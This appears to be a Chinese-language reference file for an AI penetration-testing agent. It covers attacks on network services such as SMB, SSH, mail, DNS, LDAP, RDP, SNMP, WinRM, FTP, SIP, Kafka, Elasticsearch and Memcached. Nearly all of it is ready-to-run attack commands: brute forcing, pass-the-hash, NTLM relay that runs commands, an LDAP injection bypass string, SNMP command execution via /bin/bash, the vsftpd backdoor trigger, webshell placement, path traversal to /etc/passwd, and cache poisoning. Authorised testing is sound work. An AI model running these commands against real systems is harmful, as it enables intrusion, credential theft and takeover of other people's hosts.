---
name: network-services
description: 大爱仙尊·假设作业长文（network-services）。先专卡后读本文。
---

> 作业先走 MAP.md 对应专卡。本文件是长文速查，不替代专卡。

# Network Services Pentest（非数据库端口协议）

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。

**触发**: 目标暴露非数据库的网络服务端口（21/22/25/53/110/139/143/161/389/445/5060/5900/5985/6379/9092/9200/11211/3389 等），或内网扫描发现 SMB/SMTP/DNS/LDAP/RDP 等协议。

## 领域决策直觉

1. **端口 → 协议 → 版本 → 攻击面** 四步：先识别协议和版本，再选对应攻击路径——版本决定 CVE 可用性
2. 邮件类（SMTP/IMAP/POP）无原生 RCE，价值在**凭据复用横向 + NTLM 信息泄露**；有 RCE 面的服务（SSH/SMB/RDP/SNMP/Kafka）优先
3. **NTLM 信息泄露万能钥匙**：SMB/SMTP/IMAP/POP/LDAP 的 NTLM 协商响应都泄露 Windows 版本/域名/主机名——反复用于域侦察
4. 弱口令/默认口令 > 未授权 > CVE——先测最低成本的，再上 exploit
5. 拿到凭据后统一做**密码喷洒 + PtH**（见 cracking.md / ad.md）

---

## SMB/CIFS（139/445）

- **信号**: 445 开放；`net view \\IP` / `smbclient -L //IP` 可列共享
- **枚举**: `enum4linux -a IP`（一站式）→ `nxc smb IP -u '' -p '' --shares --users --rid-brute --pass-pol` → `smbmap -R Share -H IP` 递归 → `nbtscan -r 网段`
- **攻击路径**: ①空会话/guest → IPC$/SYSVOL/NETLOGON 拉 `Registry.xml`(GPP 密码)/web.config/脚本明文密码 ②密码喷洒 `nxc smb IP -u users.txt -p 'Password1'`（先 `--pass-pol` 看锁定）③PtH `psexec.py -hashes LM:NT user@IP` ④NTLM Relay `ntlmrelayx.py -t ldap://DC --delegate-access`（Responder+WebDAV 解 SMB 签名困局）⑤可写共享投毒 logon script / SCF+LNK
- **RCE/接管**: EternalBlue MS17-010（Win7/2008R2，msf `ms17_010_eternalblue`）/ MS08-067 / PrintNightmare CVE-2021-34527（域控 RCE）/ Samba CVE-2007-2447(username map script)/CVE-2017-7494(SambaCry)；管理权限后 `psexec/smbexec/wmiexec/atexec` 全系命令执行 + `--sam/--lsa` 凭据提取
- **响应判断**: `NT_STATUS_ACCESS_DENIED`=共享存在无权限；`NT_STATUS_BAD_NETWORK_NAME`=不存在

## SSH（22）

- **信号**: 22 开放；`ssh -v -o PreferredAuthentications=none IP` 探测认证方式
- **枚举**: `ssh-audit IP`（算法与 CVE）、`nmap --script ssh-auth-methods --script-args ssh.user=root IP`
- **攻击路径**: ①爆破 `hydra -l user -P list -t 4 ssh://IP`（MaxAuthTries 默认 6）②仅 publickey → 找泄露密钥/已知弱密钥（Debian PRNG g0tmi1k/debian-ssh）③CVE-2018-15473 用户枚举（OpenSSH<7.7，msf `ssh_enumusers`）④密钥复用：`~/.ssh/id_*` + `known_hosts` 未哈希泄内网拓扑 + ssh-agent 劫持（`SSH_AUTH_SOCK=...`）
- **RCE/接管**: CVE-2024-6387 regreSSHion（OpenSSH 8.5p1-9.7p1 pre-auth RCE）/ CVE-2018-10933（libssh 0.6-0.8 发 USERAUTH_SUCCESS 绕过认证）/ CVE-2025-32433（Erlang/OTP SSH pre-auth RCE）/ xz 后门 CVE-2024-3094（`xz --version`+`ldd /usr/sbin/sshd|grep lzma`）；会话后 `-L/-R/-D` 隧道横向，SOCKS 配 proxychains；SFTP chroot 逃逸 `symlink / froot`；私钥 `ssh2john`+hashcat -m 22921

## SMTP/IMAP/POP（25/465/587、143/993、110/995）

- **信号**: 邮件服务开放；`nc -nv IP 25` + `EHLO` 看 VRFY/EXPN/AUTH/NTLM
- **枚举**: `nmap --script smtp-commands,smtp-enum-users -p 25 IP` / `smtp-user-enum -M RCPT -U users.txt -t IP`（RCPT TO 响应码判用户）/ `nmap --script imap-ntlm-info,imap-capabilities -p 143 IP` / `curl -k 'imaps://IP/INBOX?ALL' --user user:pass`
- **攻击路径**: ①用户枚举（VRFY/EXPN/RCPT TO）→ 爆破（SMTP 一般无锁定但控速）②开放中继测试 `MAIL FROM:<ext>→RCPT TO:<ext>→DATA` ③邮件伪造：先 `dig txt _dmarc target.com TXT` 判 SPF/DMARC（p=none → 伪造可行），swaks 发送，SMTP Smuggling（`\r\n.\r\nMAIL FROM:` 绕 SEG）④Exchange NTLM 信息泄露（版本/域/主机名）⑤登录后 `LIST`→`RETR n` 下载全部邮件，搜密码重置/VPN/SSH 配置/附件
- **RCE/接管**: Exim CVE-2019-10149（WIZard，4.87-4.91 RCE）/ OpenSMTPD CVE-2020-7247 / Sendmail 8.x 老 RCE；Postfix `master.cf` flags=Rq argv=script 可配命令执行；经 Exchange HTTP 打 ProxyLogon(26855)/ProxyShell(34473)、Zimbra CVE-2022-27925/37042

## DNS（53）

- **信号**: 53 开放；域名解析相关
- **枚举**: `dig version.bind CHAOS TXT @IP`（版本）/ `dig axfr <DOMAIN> @IP`（区域传送）/ `dnsrecon -r 10.0.0.0/24 -n IP`（PTR 反查）/ `dig -t SRV _ldap._tcp.<DOMAIN> @IP`（AD 域控定位）
- **攻击路径**: ①AXFR 成功 → 整域记录泄露（内网 IP/MX/TXT 令牌）②递归开放（响应含 `ra` 标志）→ 信息收集 + 放大攻击 ③NSEC zone walking（`nmap --script dns-nsec-enum`）④子域爆破（dnsenum/dnscan/gobuster dns）
- **RCE/接管**: Windows DNS CVE-2020-1350（SIGRed，RCE CVSS10）/ CVE-2021-24078；BIND GSS-TSIG 溢出 CVE-2021-25216、TSIG 认证绕过 CVE-2017-3143（未授权区域更新）；dnsmasq CVE-2020-25681~87（DNSpooq）；无 shell 时 DNS 隧道（iodine/dnscat2）做隐蔽 C2；后渗透审 `allow-transfer/allow-recursion/allow-query` 是否 any

## LDAP（389/636/3268/3269）

- **信号**: 389 开放 / AD 域控 / 目录枚举需求
- **枚举**: `ldapsearch -x -H ldap://IP -s base namingcontexts`（Base DN，免认证）/ `ldapdomaindump IP -u 'DOMAIN\user' -p 'pass'`（全量导出）/ `nxc ldap IP -u '' -p '' --query "(sAMAccountName=*)" ""`（匿名枚举）
- **攻击路径**: ①匿名绑定成功 → 全目录枚举 ②敏感属性：`description` 常存临时密码、`userPassword/sshPublicKey`（OpenLDAP）③LDAP 注入：认证绕过 `user=*)(uid=*))(|(uid=*` ④密码策略提取 `lockoutThreshold=0` → 可安全爆破 ⑤配合 Kerberoasting 找 SPN 账户
- **RCE/接管**: 可写属性是核心——`sshPublicKey` 可写 → 注入公钥直接 SSH 登录（ldap3 `conn.modify`）；`msDS-AllowedToActOnBehalfOfOtherIdentity` 可写 → RBCD 提权；`member` 可写 → 把自己加进特权组；明文 389 可嗅探所有绑定凭据

## RDP（3389）

- **信号**: 3389 开放；需验凭据/会话接管
- **枚举**: `nmap --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -p 3389 IP`（NLA 状态/NTLM 泄露）/ `nxc rdp IP -u user -p pass`（验凭据，`--nla-screenshot` 无 NLA 可免认证截图）
- **攻击路径**: ①爆破 crowbar（专为 RDP，低速防锁）②PtH `xfreerdp /u:user /pth:<hash> /v:IP` ③NLA 未启用 → 免认证信息收集 + BlueKeep 更可靠
- **RCE/接管**: CVE-2019-0708 BlueKeep（Win7/2008R2 pre-auth RCE，msf `cve_2019_0708_bluekeep_rce`）/ CVE-2012-0002（MS12-020 DoS）；SYSTEM 后 `query user` + `tscon <ID> /dest:` 劫持管理员会话免密；Sticky Keys 后门（sethc.exe→cmd.exe）；rdp2tcp 虚拟通道隧道

## VNC（5800/5900-5901）

- **信号**: VNC 开放；需免密/爆破
- **枚举**: `nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <port> IP`、msf `vnc_none_auth` 检测无认证
- **攻击路径**: ①无认证 → `vncviewer IP::5900` 直连 ②爆破 `hydra -s 5900 -P list vnc://IP`（VNC 无用户名）③密码文件解密：VNC 密码用 3DES 固定密钥（已逆向），`~/.vnc/passwd`（Linux）/TightVNC 注册表/UltraVNC `ultravnc.ini` 拿到后 `vncpwd`/`vncpasswd.py -d` 解出明文
- **RCE/接管**: 连上桌面即完全接管；RealVNC 4.1.0-4.1.1 认证绕过（`realvnc-auth-bypass` 脚本）；LibVNCServer CVE-2018-15127 / TigerVNC CVE-2019-15691~95 溢出

## SNMP（161 UDP / 162 trap）

- **信号**: 161 开放；需枚举设备信息
- **枚举**: `snmpwalk -v2c -c public IP .1`（默认字符串，有响应即有效）/ `onesixtyone -c <dict> IP`（社区字符串爆破）/ `snmp-check IP -p 161 -c public`；定向 OID：进程 `1.3.6.1.2.1.25.4.2.1.2`（命令行常含密码）/ 用户 `1.3.6.1.4.1.77.1.2.25` / TCP 端口
- **攻击路径**: ①RO 只读 → 信息收集 ②判断 RW：`snmpset -v2c -c <comm> IP 1.3.6.1.2.1.1.6.0 s test`（成功即 RW）③SNMPv3 降级/字典攻击
- **RCE/接管**: RW+Linux（NET-SNMP-EXTEND-MIB）：`snmpset -m +NET-SNMP-EXTEND-MIB 'nsExtendStatus."x"'=createAndGo 'nsExtendCommand."x"'=/bin/bash ...` → `snmpwalk ... nsExtendObjects` 触发命令执行（run-on-read），`snmp-shell` 直接交互 shell；Cisco RW：`snmp-ios-config`/`cisco_config_tftp` 拉 running-config 拿 enable secret

## WinRM（5985 HTTP / 5986 HTTPS）

- **信号**: WinRM 开放；需 PS-Remoting/横向
- **枚举**: `Test-WSMan IP` / `nxc winrm IP` / `nxc winrm IP -u user -p pass -x "whoami"`
- **攻击路径**: ①凭据：密码/PtH（`evil-winrm -i IP -u user -H hash`）/Kerberos（`-k --spn HTTP/IP`）/证书（AD CS `--cert-pem/--key-pem`）②`Invoke-Command`/`Enter-PSSession` 远程执行 ③Evil-WinRM 高级：`-s` 加载 PS 脚本、`-e` Invoke-Binary SharpHound、upload/download
- **RCE/接管**: 直接命令执行即接管；NTLM Relay：`ntlmrelayx.py -t wsman://IP --no-smb-server -smb2support --command "net user ..."`（5985 HTTP 暴露才可，`EnableCompatibilityHttpListener=true` 扩大面）；OMIGOD CVE-2021-38647（Azure OMI 未认证 root RCE）；CLM 受限模式用 `WSMan.Automation` COM 绕过

## FTP（21）

- **信号**: 21 开放 / Banner 含 vsftpd/ProFTPD
- **枚举**: `nc -vn IP 21`（banner）/ `nmap --script ftp-* -p 21 IP` / `wget -m ftp://anonymous:anonymous@IP`（递归下载）/ `HELP/FEAT/STAT` 特性探测
- **攻击路径**: ①匿名登录（anonymous:anonymous/ftp:ftp）→ 找 .conf/.bak/.sql/私钥 ②可写检查 → 上传 Webshell（需 FTP 根映射 Web 目录，常见 XAMPP `/opt/lampp/htdocs`）③爆破 `hydra -t 1 -l user -P list IP ftp` ④FTP Bounce（`nmap -b ftp:ftp@SVR TARGET`）借 FTP 当代理扫内网/发 HTTP
- **RCE/接管**: vsftpd 2.3.4 后门：用户名带 `:)` → 端口 6200 root shell；ProFTPD mod_copy：`SITE CPFR /var/www/shell.php` + `SITE CPTO` 无需认证复制文件到 Web 目录；FileZilla Server 14147 管理端口默认空密码 → 建用户接管；注意 web 表单 CRLF 注入（`%250d%250a`）

## VoIP/SIP（5060 UDP/TCP，5061 TLS + RTP）

- **信号**: VoIP 设备；需枚举分机/劫持通话
- **枚举**: `svmap 10.0.0.0/24 -p 5060-5070 --fp`（设备发现）/ `svwar IP -p5060 -e100-300 -m REGISTER`（分机枚举）/ `sippts exten -i IP -e 100-200`；PBX 附属端口 5038（Asterisk AMI）/69 TFTP/FreePBX Web
- **攻击路径**: ①在线爆破 `svcrack -u100 -d dict udp://IP:5080` / `sippts rcrack` ②离线 `sipdump -p cap.pcap` + `sipcrack`（摘要认证破解）③SIP Digest Leak（`sippts leak` 诱电话回 407 认证响应）④ARP 欺骗 + `ucsniff` 窃听未加密 RTP/DTMF ⑤Asterisk 免费拨号（`insecure=port,invite` + `allowguest=true`）
- **RCE/接管**: 拿 Asterisk 配置写权限 → 拨号计划 `System()`/`Shell()` 命令执行 = `sip.conf/extensions.conf/manager.conf/FreePBX.conf/Elastix.conf`（明文密码）接管；RTCPBleed（`sippts rtcpbleed` 劫持媒体流）；`${EXTEN}` 注入 `101&SIP123123123` 打外部号码

## Kafka（9092 Broker / 2181 ZooKeeper / 8081 Schema Registry / 8083 Connect）

- **信号**: 默认无认证，`kafka-topics.sh --list` 能列出即未授权
- **枚举**: `kcat -b IP:9092 -L` / `kafka-topics.sh --list --describe` / `echo ruok | nc IP 2181`（返回 imok 即 ZK 未授权）/ `curl :8083/connectors` / `curl :8081/subjects`
- **攻击路径**: ①Broker 未授权 → `kafka-console-consumer.sh --from-beginning --max-messages` 批量导消息 ②Consumer Group `--reset-offsets --to-earliest` 重放消息 ③ZooKeeper `ls /brokers/topics; get /brokers/ids/0` 拉元数据 ④Schema Registry 泄露数据结构
- **RCE/接管**: Kafka Connect 是唯一 RCE 面：读 Connector `/config` 窃取数据库密码 → POST 恶意 `FileStreamSinkConnector` 把 topic 写入目标文件系统；或投毒 Producer 触发下游反序列化；谨慎：Offset 重置/删 Connector 破坏业务

## Elasticsearch（9200 HTTP / 9300）

- **信号**: 9200 返回 JSON 含 `cluster_name`/`version.number` 即未授权
- **枚举**: `curl http://IP:9200/`（版本）/ `:9200/_cat/indices?v`（索引）/ `:9200/_search`（数据）/ `:9200/_xpack/security/user`（X-Pack 状态）；默认凭据 `elastic:changeme`
- **攻击路径**: ①未授权 → `_search`+`_scroll` 批量导出（搜 password/token 字段）②快照仓库滥用（注册 fs 仓库 → `_snapshot/.../_restore` 窃取）③Ingest Pipeline 注入篡改数据 ④集群管理权限 → 创建 superuser 后门 ⑤Kibana 暴露 → Dev Tools 入口
- **RCE/接管**: 版本分叉——<1.2 MVEL RCE（CVE-2014-3120，`script` filter 反射 Runtime）；1.3.x-1.4.x Groovy 沙箱逃逸（CVE-2015-1427，`"id".execute()`）；<1.4.3 `/_plugin/head/../../../../etc/passwd` 路径穿越读文件；>=5.x 无 RCE 但可全量数据接管

## Memcached（11211 TCP/UDP）

- **信号**: `echo "version" | nc` 返回 VERSION 即未授权
- **枚举**: `echo "stats" | nc IP 11211` / `memcdump --servers=IP`（导出键名）/ `echo "stats cachedump <slab> 0" | nc`（<1.4.31）或 `echo 'lru_crawler metadump all' | nc`（>=1.4.31）
- **攻击路径**: ①未授权 → 键名 → `get <key>` 提取会话 token/API key/序列化对象 ②缓存投毒 `printf "set key 0 3600 11\r\nmalicious\r\n" | nc` 改会话越权/注入反序列化 payload ③UDP 11211 放大比最高 51000x（DDoS 反射源）
- **RCE/接管**: 无直接 RCE；接管方式 = 篡改会话/注入反序列化对象（配合应用层反序列化链）；DoD 版本 CVE-2021-37519 堆溢出（仅 DoS）

---

## 服务 → 口令字典（scripts/dic/port/）

爆破用字典已内置 `scripts/dic/port/<service>/`（user.txt + pass.txt，按服务分目录）：ssh/ftp/rdp/mysql/postgresql/mssql/oracle/redis/mongodb/memcached/snmp/smtp/pop3/svn/telnet/vnc/esxi/weblogic/db2。默认口令另见 `scripts/dic/device-default/`（安全设备/OA 默认凭据）。
